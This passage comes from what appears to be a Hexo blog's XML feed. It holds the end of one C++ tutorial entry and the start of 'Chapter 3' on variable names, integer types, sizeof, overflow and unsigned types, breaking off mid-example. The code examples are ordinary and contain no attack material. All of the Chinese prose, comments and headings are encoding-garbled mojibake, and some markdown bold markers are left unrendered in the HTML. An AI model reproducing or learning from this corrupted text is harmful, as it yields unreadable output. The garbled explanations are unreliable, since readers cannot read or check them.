å’Œè¾“å‡ºè¿ç®—ç¬¦ (<code>&lt;&lt;</code>) çš„é‡è½½ã€‚</li><li>  é€šè¿‡éšæœºæ¼«æ­¥æ¨¡æ‹Ÿå±•ç¤ºäº† <code>Vector</code> ç±»çš„å®é™…åº”ç”¨ã€‚</li></ul></li><li><p><strong>ç±»çš„ç±»å‹è½¬æ¢:</strong></p><ul><li>  <strong>æ„é€ å‡½æ•°è½¬æ¢:</strong> æ¥å—å•ä¸ªå‚æ•°çš„æ„é€ å‡½æ•°ï¼ˆé™¤éå£°æ˜ä¸º <code>explicit</code>ï¼‰å®šä¹‰äº†ä»å‚æ•°ç±»å‹åˆ°ç±»ç±»å‹çš„<strong>éšå¼è½¬æ¢</strong>ã€‚</li><li>  <strong>è½¬æ¢å‡½æ•°:</strong> <code>operator typeName()</code> å½¢å¼çš„æˆå‘˜å‡½æ•°ï¼ˆé™¤éå£°æ˜ä¸º <code>explicit</code>ï¼‰å®šä¹‰äº†ä»ç±»ç±»å‹åˆ° <code>typeName</code> ç±»å‹çš„<strong>éšå¼è½¬æ¢</strong>ã€‚</li><li>  <strong><code>explicit</code> å…³é”®å­—:</strong> ç”¨äºé˜»æ­¢æ„é€ å‡½æ•°å’Œè½¬æ¢å‡½æ•°è¿›è¡Œéšå¼è½¬æ¢ï¼Œæé«˜ä»£ç å®‰å…¨æ€§ï¼Œé¿å…æ„å¤–è½¬æ¢å’ŒäºŒä¹‰æ€§ã€‚</li><li>  <strong>äºŒä¹‰æ€§:</strong> å½“å­˜åœ¨å¤šä¸ªè½¬æ¢è·¯å¾„ï¼ˆé€šè¿‡æ„é€ å‡½æ•°æˆ–è½¬æ¢å‡½æ•°ï¼‰æ—¶ï¼Œå¯èƒ½å¯¼è‡´ç¼–è¯‘é”™è¯¯ã€‚åº”è°¨æ…è®¾è®¡è½¬æ¢è§„åˆ™æˆ–ä½¿ç”¨ <code>explicit</code>ã€‚</li></ul></li></ol><p>é€šè¿‡åˆç†è¿ç”¨è¿ç®—ç¬¦é‡è½½ã€å‹å…ƒå’Œç±»å‹è½¬æ¢ï¼Œå¯ä»¥åˆ›å»ºå‡ºåŠŸèƒ½ä¸°å¯Œã€æ˜“äºä½¿ç”¨ä¸”è¡¨è¾¾åŠ›å¼ºçš„ C++ ç±»ã€‚ç„¶è€Œï¼Œè¿™äº›ç‰¹æ€§ä¹Ÿéœ€è¦è°¨æ…ä½¿ç”¨ï¼Œä»¥é¿å…å¼•å…¥ä¸å¿…è¦çš„å¤æ‚æ€§æˆ–æ½œåœ¨çš„é”™è¯¯ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chapter 3 å¤„ç†æ•°æ®</title>
      <link href="2025/04/26/Cpp_tutorial_Chapter_3/"/>
      <url>2025/04/26/Cpp_tutorial_Chapter_3/</url>
      
        <content type="html"><![CDATA[<h2 id="3-1-ç®€å•å˜é‡"><a href="#3-1-ç®€å•å˜é‡" class="headerlink" title="3.1 ç®€å•å˜é‡"></a>3.1 ç®€å•å˜é‡</h2><p>åœ¨ç¬¬2ç« ä¸­ï¼Œæˆ‘ä»¬å·²ç»æ¥è§¦äº†å˜é‡çš„å£°æ˜å’Œä½¿ç”¨ã€‚æœ¬ç« å°†æ·±å…¥æ¢è®¨C++çš„åŸºæœ¬æ•°æ®ç±»å‹ï¼Œé¦–å…ˆä»ç”¨äºå­˜å‚¨æ•°å­—å’Œå­—ç¬¦çš„ç®€å•å˜é‡å¼€å§‹ã€‚ç®€å•å˜é‡æ˜¯C++ä¸­å­˜å‚¨æ•°æ®çš„åŸºæœ¬å•å…ƒã€‚</p><h3 id="3-1-1-å˜é‡å"><a href="#3-1-1-å˜é‡å" class="headerlink" title="3.1.1 å˜é‡å"></a>3.1.1 å˜é‡å</h3><p>å˜é‡åæ˜¯èµ‹äºˆå†…å­˜ä½ç½®çš„æ ‡è¯†ç¬¦ï¼Œç”¨äºè®¿é—®å­˜å‚¨åœ¨è¯¥ä½ç½®çš„æ•°æ®ã€‚åœ¨C++ä¸­ï¼Œé€‰æ‹©æœ‰æ„ä¹‰çš„å˜é‡åæ˜¯è‰¯å¥½ç¼–ç¨‹å®è·µçš„ä¸€éƒ¨åˆ†ã€‚</p><p><strong>å‘½åè§„åˆ™:</strong></p><ol><li> <strong>å­—ç¬¦é›†:</strong> å˜é‡ååªèƒ½åŒ…å«å­—æ¯ï¼ˆå¤§å°å†™ï¼‰ã€æ•°å­—å’Œä¸‹åˆ’çº¿ <code>_</code>ã€‚</li><li> <strong>é¦–å­—ç¬¦:</strong> åç§°çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸èƒ½æ˜¯æ•°å­—ã€‚</li><li> <strong>åŒºåˆ†å¤§å°å†™:</strong> C++æ˜¯å¤§å°å†™æ•æ„Ÿçš„ï¼Œ<code>myVariable</code> å’Œ <code>myvariable</code> æ˜¯ä¸¤ä¸ªä¸åŒçš„å˜é‡åã€‚</li><li> <strong>ä¸èƒ½æ˜¯å…³é”®å­—:</strong> ä¸èƒ½ä½¿ç”¨C++å…³é”®å­—ï¼ˆå¦‚ <code>int</code>, <code>double</code>, <code>return</code>, <code>if</code>, <code>class</code> ç­‰ï¼‰ä½œä¸ºå˜é‡åã€‚</li><li> <strong>é•¿åº¦é™åˆ¶:</strong> C++å¯¹åç§°çš„é•¿åº¦æ²¡æœ‰ç¡¬æ€§è§„å®šï¼Œä½†é•¿åç§°å¯èƒ½ä¼šåœ¨æŸäº›æ—§ç¼–è¯‘å™¨æˆ–é“¾æ¥å™¨ä¸Šé‡åˆ°é—®é¢˜ã€‚é€šå¸¸ï¼Œæœ‰æ„ä¹‰ä¸”ä¸è¿‡äºå†—é•¿çš„åç§°æ˜¯æœ€å¥½çš„ã€‚</li><li><strong>ä¸‹åˆ’çº¿çš„ä½¿ç”¨:</strong><ul><li>  ä»¥ä¸¤ä¸ªä¸‹åˆ’çº¿ <code>__</code> å¼€å¤´æˆ–ä»¥ä¸‹åˆ’çº¿å’Œå¤§å†™å­—æ¯ <code>_A</code> åˆ° <code>_Z</code> å¼€å¤´çš„åç§°è¢«ä¿ç•™ç»™ç¼–è¯‘å™¨åŠå…¶ä½¿ç”¨çš„èµ„æºä½¿ç”¨ã€‚</li><li>  ä»¥ä¸‹åˆ’çº¿ <code>_</code> å¼€å¤´çš„åç§°è¢«ä¿ç•™ç”¨ä½œå…¨å±€æ ‡è¯†ç¬¦ã€‚</li><li>  è™½ç„¶åœ¨æŸäº›æƒ…å†µä¸‹å¯ä»¥ä½¿ç”¨ä»¥ä¸‹åˆ’çº¿å¼€å¤´çš„åç§°ï¼ˆä¾‹å¦‚åœ¨å‡½æ•°å†…éƒ¨ï¼‰ï¼Œä½†æœ€å¥½é¿å…è¿™ç§ç”¨æ³•ï¼Œä»¥é˜²ä¸ç³»ç»Ÿä½¿ç”¨çš„åç§°å†²çªã€‚</li></ul></li></ol><p><strong>å‘½åçº¦å®š (éå¼ºåˆ¶ï¼Œä½†æ¨è):</strong></p><ul><li>  <strong>æœ‰æ„ä¹‰:</strong> å˜é‡ååº”åæ˜ å…¶å­˜å‚¨çš„æ•°æ®æˆ–ç”¨é€”ï¼ˆä¾‹å¦‚ <code>numberOfStudents</code>, <code>userName</code>, <code>totalScore</code>ï¼‰ã€‚</li><li>  <strong>é©¼å³°å‘½åæ³• (Camel Case):</strong> ä»ç¬¬äºŒä¸ªå•è¯å¼€å§‹ï¼Œæ¯ä¸ªå•è¯çš„é¦–å­—æ¯å¤§å†™ï¼ˆä¾‹å¦‚ <code>myVariableName</code>, <code>studentAge</code>ï¼‰ã€‚è¿™æ˜¯C++ä¸­å¸¸è§çš„é£æ ¼ã€‚</li><li>  <strong>ä¸‹åˆ’çº¿åˆ†éš” (Snake Case):</strong> ä½¿ç”¨ä¸‹åˆ’çº¿åˆ†éš”å•è¯ï¼ˆä¾‹å¦‚ <code>my_variable_name</code>, <code>student_age</code>ï¼‰ã€‚è¿™ä¹Ÿæ˜¯ä¸€ç§å¸¸è§çš„é£æ ¼ã€‚</li><li>  é€‰æ‹©ä¸€ç§é£æ ¼å¹¶ä¿æŒä¸€è‡´ã€‚</li></ul><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// åˆæ³•çš„å˜é‡å</span></span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="keyword">double</span> accountBalance;</span><br><span class="line">    <span class="keyword">char</span> first_initial;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> populationOfEarth;</span><br><span class="line">    <span class="keyword">int</span> _internal_counter; <span class="comment">// åˆæ³•ï¼Œä½†ä¸æ¨èåœ¨å…¨å±€ä½¿ç”¨</span></span><br><span class="line">    <span class="keyword">int</span> value2;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// éæ³•çš„å˜é‡å</span></span><br><span class="line">    <span class="comment">// int 1stPlace;      // ä¸èƒ½ä»¥æ•°å­—å¼€å¤´</span></span><br><span class="line">    <span class="comment">// double account Balance; // ä¸èƒ½åŒ…å«ç©ºæ ¼</span></span><br><span class="line">    <span class="comment">// int return;        // ä¸èƒ½æ˜¯å…³é”®å­—</span></span><br><span class="line">    <span class="comment">// char my-char;      // ä¸èƒ½åŒ…å«è¿å­—ç¬¦ &#x27;-&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// åŒºåˆ†å¤§å°å†™</span></span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">int</span> Count = <span class="number">20</span>; </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;count: &quot;</span> &lt;&lt; count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 10</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Count: &quot;</span> &lt;&lt; Count &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 20</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-1-2-æ•´å‹"><a href="#3-1-2-æ•´å‹" class="headerlink" title="3.1.2 æ•´å‹"></a>3.1.2 æ•´å‹</h3><p><strong>æ•´å‹ (Integer)</strong> æ˜¯æ²¡æœ‰å°æ•°éƒ¨åˆ†çš„æ•°å­—ã€‚C++æä¾›äº†å¤šç§æ•´å‹ç±»å‹æ¥å­˜å‚¨æ•´æ•°ï¼Œå®ƒä»¬çš„ä¸»è¦åŒºåˆ«åœ¨äºå ç”¨çš„å†…å­˜ç©ºé—´å¤§å°ä»¥åŠèƒ½å¤Ÿè¡¨ç¤ºçš„æ•°å€¼èŒƒå›´ã€‚</p><p>è®¡ç®—æœºå†…å­˜ç”±ç§°ä¸º<strong>ä½ (bit)</strong> çš„å•å…ƒç»„æˆã€‚8ä¸ªä½ç»„æˆä¸€ä¸ª**å­—èŠ‚ (byte)**ã€‚æ¯ä¸ªä½å¯ä»¥è¡¨ç¤ºä¸¤ç§çŠ¶æ€ï¼ˆé€šå¸¸æ˜¯0æˆ–1ï¼‰ã€‚å­—èŠ‚æ˜¯å†…å­˜ä¸­æœ€å°çš„å¯å¯»å€å•å…ƒï¼Œæ„å‘³ç€æ¯ä¸ªå­—èŠ‚éƒ½æœ‰ä¸€ä¸ªå”¯ä¸€çš„åœ°å€ã€‚</p><p>ä¸åŒçš„æ•´å‹ç±»å‹ä½¿ç”¨ä¸åŒæ•°é‡çš„å­—èŠ‚æ¥å­˜å‚¨å€¼ã€‚ä½¿ç”¨çš„å­—èŠ‚æ•°è¶Šå¤šï¼Œå¯ä»¥è¡¨ç¤ºçš„æ•´æ•°èŒƒå›´å°±è¶Šå¤§ã€‚</p><p><strong>åŸºæœ¬æ•´å‹ç±»å‹:</strong></p><ul><li>  <code>short</code></li><li>  <code>int</code></li><li>  <code>long</code></li><li>  <code>long long</code> (C++11 æ–°å¢)</li></ul><p>æˆ‘ä»¬å°†åœ¨ä¸‹ä¸€èŠ‚è¯¦ç»†è®¨è®ºè¿™äº›ç±»å‹ã€‚</p><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// å£°æ˜ä¸åŒç±»å‹çš„æ•´å‹å˜é‡</span></span><br><span class="line">    <span class="keyword">short</span> smallNumber;</span><br><span class="line">    <span class="keyword">int</span> standardInteger;</span><br><span class="line">    <span class="keyword">long</span> largeInteger;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> veryLargeInteger; <span class="comment">// éœ€è¦ C++11 æˆ–æ›´é«˜ç‰ˆæœ¬</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// èµ‹å€¼</span></span><br><span class="line">    smallNumber = <span class="number">10</span>;</span><br><span class="line">    standardInteger = <span class="number">10000</span>;</span><br><span class="line">    largeInteger = <span class="number">1000000</span>;</span><br><span class="line">    veryLargeInteger = <span class="number">10000000000L</span>L; <span class="comment">// LL åç¼€è¡¨ç¤º long long</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;short: &quot;</span> &lt;&lt; smallNumber &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;int: &quot;</span> &lt;&lt; standardInteger &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;long: &quot;</span> &lt;&lt; largeInteger &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;long long: &quot;</span> &lt;&lt; veryLargeInteger &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-1-3-æ•´å‹shortã€intã€longå’Œlong-long"><a href="#3-1-3-æ•´å‹shortã€intã€longå’Œlong-long" class="headerlink" title="3.1.3 æ•´å‹shortã€intã€longå’Œlong long"></a>3.1.3 æ•´å‹shortã€intã€longå’Œlong long</h3><p>C++æ ‡å‡†è§„å®šäº†å„ç§æ•´å‹ç±»å‹çš„æœ€å°å°ºå¯¸ï¼ˆå ç”¨çš„å†…å­˜ä½æ•°ï¼‰ï¼Œä½†å…·ä½“å°ºå¯¸å¯èƒ½å› ç¼–è¯‘å™¨å’Œæ“ä½œç³»ç»Ÿè€Œå¼‚ã€‚</p><p><strong>æ ‡å‡†è§„å®šçš„æœ€å°å°ºå¯¸:</strong></p><ul><li>  <code>short</code>: è‡³å°‘16ä½ã€‚</li><li>  <code>int</code>: è‡³å°‘å’Œ <code>short</code> ä¸€æ ·å¤§ï¼Œé€šå¸¸æ˜¯ç³»ç»Ÿå¤„ç†æ•ˆç‡æœ€é«˜çš„æ•´æ•°é•¿åº¦ï¼ˆä¾‹å¦‚ï¼Œåœ¨32ä½ç³»ç»Ÿä¸Šé€šå¸¸æ˜¯32ä½ï¼Œ64ä½ç³»ç»Ÿä¸Šå¯èƒ½æ˜¯32ä½æˆ–64ä½ï¼‰ã€‚</li><li>  <code>long</code>: è‡³å°‘32ä½ï¼Œä¸”è‡³å°‘å’Œ <code>int</code> ä¸€æ ·å¤§ã€‚</li><li>  <code>long long</code>: è‡³å°‘64ä½ï¼Œä¸”è‡³å°‘å’Œ <code>long</code> ä¸€æ ·å¤§ã€‚</li></ul><p><strong>å¦‚ä½•æŸ¥çœ‹å…·ä½“å°ºå¯¸:</strong></p><p>å¯ä»¥ä½¿ç”¨ <code>sizeof</code> è¿ç®—ç¬¦æ¥æŸ¥çœ‹ç‰¹å®šç±»å‹åœ¨ä½ çš„ç³»ç»Ÿä¸Šå ç”¨çš„å­—èŠ‚æ•°ã€‚</p><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;climits&gt; // åŒ…å«æ•´å‹é™åˆ¶ä¿¡æ¯ (å¦‚ INT_MAX)</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// ä½¿ç”¨ sizeof æŸ¥çœ‹å„ç§ç±»å‹å ç”¨çš„å­—èŠ‚æ•°</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Size of short: &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>(<span class="keyword">short</span>) &lt;&lt; <span class="string">&quot; bytes&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Size of int: &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>(<span class="keyword">int</span>) &lt;&lt; <span class="string">&quot; bytes&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Size of long: &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>(<span class="keyword">long</span>) &lt;&lt; <span class="string">&quot; bytes&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Size of long long: &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>(<span class="keyword">long</span> <span class="keyword">long</span>) &lt;&lt; <span class="string">&quot; bytes&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æŸ¥çœ‹ int ç±»å‹çš„æœ€å¤§å€¼ (éœ€è¦ &lt;climits&gt;)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Maximum value for int: &quot;</span> &lt;&lt; INT_MAX &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">// ç±»ä¼¼åœ°ï¼Œæœ‰ SHRT_MAX, LONG_MAX, LLONG_MAX ç­‰</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å£°æ˜å’Œåˆå§‹åŒ–</span></span><br><span class="line">    <span class="keyword">short</span> s_value = <span class="number">32767</span>; <span class="comment">// é€šå¸¸æ˜¯ short çš„æœ€å¤§å€¼ (å¦‚æœ short æ˜¯ 16 ä½)</span></span><br><span class="line">    <span class="keyword">int</span> i_value = <span class="number">2000000000</span>; </span><br><span class="line">    <span class="keyword">long</span> l_value = <span class="number">1000000000L</span>; <span class="comment">// L åç¼€è¡¨ç¤º long (å¯é€‰ï¼Œä½†æœ‰æ—¶æœ‰åŠ©äºæ¸…æ™°)</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ll_value = <span class="number">50000000000L</span>L; <span class="comment">// LL åç¼€è¡¨ç¤º long long</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;short value: &quot;</span> &lt;&lt; s_value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;int value: &quot;</span> &lt;&lt; i_value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;long value: &quot;</span> &lt;&lt; l_value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;long long value: &quot;</span> &lt;&lt; ll_value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æº¢å‡ºç¤ºä¾‹ (è¡Œä¸ºæ˜¯æœªå®šä¹‰çš„æˆ–å›ç»•)</span></span><br><span class="line">    <span class="keyword">short</span> max_short = SHRT_MAX;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Max short: &quot;</span> &lt;&lt; max_short &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    max_short = max_short + <span class="number">1</span>; <span class="comment">// å°è¯•è¶…å‡ºæœ€å¤§å€¼</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Max short + 1: &quot;</span> &lt;&lt; max_short &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// å¯èƒ½å˜æˆè´Ÿæ•°</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„:</strong> å½“ä¸€ä¸ªæ•´æ•°å€¼è¶…å‡ºäº†å…¶ç±»å‹æ‰€èƒ½è¡¨ç¤ºçš„æœ€å¤§èŒƒå›´æ—¶ï¼Œä¼šå‘ç”Ÿ<strong>æº¢å‡º (Overflow)**ã€‚å¯¹äºæœ‰ç¬¦å·æ•´æ•°æº¢å‡ºï¼ŒC++æ ‡å‡†è§„å®šå…¶è¡Œä¸ºæ˜¯</strong>æœªå®šä¹‰çš„ (Undefined Behavior)**ï¼Œè¿™æ„å‘³ç€ä»»ä½•äº‹æƒ…éƒ½å¯èƒ½å‘ç”Ÿï¼ˆç¨‹åºå´©æºƒã€å¾—åˆ°å¥‡æ€ªçš„ç»“æœç­‰ï¼‰ã€‚å¯¹äºæ— ç¬¦å·æ•´æ•°æº¢å‡ºï¼Œè¡Œä¸ºæ˜¯å®šä¹‰å¥½çš„ï¼ˆé€šå¸¸æ˜¯å›ç»•ï¼Œå³ä»0é‡æ–°å¼€å§‹ï¼‰ã€‚</p><h3 id="3-1-4-æ— ç¬¦å·ç±»å‹"><a href="#3-1-4-æ— ç¬¦å·ç±»å‹" class="headerlink" title="3.1.4 æ— ç¬¦å·ç±»å‹"></a>3.1.4 æ— ç¬¦å·ç±»å‹</h3><p>å¯¹äºæ¯ç§æ•´å‹ï¼ˆ<code>short</code>, <code>int</code>, <code>long</code>, <code>long long</code>ï¼‰ï¼Œéƒ½å­˜åœ¨ä¸€ä¸ªå¯¹åº”çš„<strong>æ— ç¬¦å· (unsigned)</strong> ç‰ˆæœ¬ã€‚æ— ç¬¦å·ç±»å‹åªèƒ½å­˜å‚¨éè´Ÿæ•´æ•°ï¼ˆ0å’Œæ­£æ•°ï¼‰ã€‚</p><p>é€šè¿‡åœ¨ç±»å‹åå‰åŠ ä¸Š <code>unsigned</code> å…³é”®å­—æ¥å£°æ˜æ— ç¬¦å·ç±»å‹ã€‚</p><p><strong>ç‰¹ç‚¹:</strong></p><ul><li>  <strong>èŒƒå›´:</strong> åœ¨ç›¸åŒçš„å­—èŠ‚æ•°ä¸‹ï¼Œæ— ç¬¦å·ç±»å‹å¯ä»¥è¡¨ç¤ºçš„æœ€å¤§å€¼å¤§çº¦æ˜¯æœ‰ç¬¦å·ç±»å‹çš„ä¸¤å€ï¼Œå› ä¸ºå®ƒä»¬ä¸éœ€è¦ç”¨ä¸€ä½æ¥è¡¨ç¤ºæ­£è´Ÿå·ã€‚èŒƒå›´ä» 0 å¼€å§‹ã€‚</li><li>  <strong>ç”¨é€”:</strong> å½“ä½ çŸ¥é“ä¸€ä¸ªå˜é‡æ°¸è¿œä¸ä¼šæ˜¯è´Ÿæ•°æ—¶ï¼ˆä¾‹å¦‚ï¼Œè®¡æ•°å™¨ã€æ•°ç»„ç´¢å¼•ã€äººå£æ•°é‡ç­‰ï¼‰ï¼Œä½¿ç”¨æ— ç¬¦å·ç±»å‹å¯ä»¥å¢å¤§å…¶å¯è¡¨ç¤ºçš„æ­£æ•°èŒƒå›´ã€‚</li><li>  <strong>å›ç»• (Wrap Around):</strong> å½“æ— ç¬¦å·æ•´æ•°çš„å€¼è¶…å‡ºå…¶æœ€å¤§èŒƒå›´æ—¶ï¼Œå®ƒä¼šä»0é‡æ–°å¼€å§‹ï¼ˆæ¨¡è¿ç®—ï¼‰ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä¸€ä¸ª <code>unsigned short</code> çš„æœ€å¤§å€¼æ˜¯ 65535ï¼Œé‚£ä¹ˆ <code>65535 + 1</code> ä¼šå˜æˆ <code>0</code>ã€‚åŒæ ·ï¼Œ<code>0 - 1</code> ä¼šå˜æˆ <code>65535</code>ã€‚</li></ul><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;climits&gt; // åŒ…å« UINT_MAX ç­‰</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// å£°æ˜æ— ç¬¦å·ç±»å‹</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> us_value;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> ui_value;</span><br><span class="line">    <span 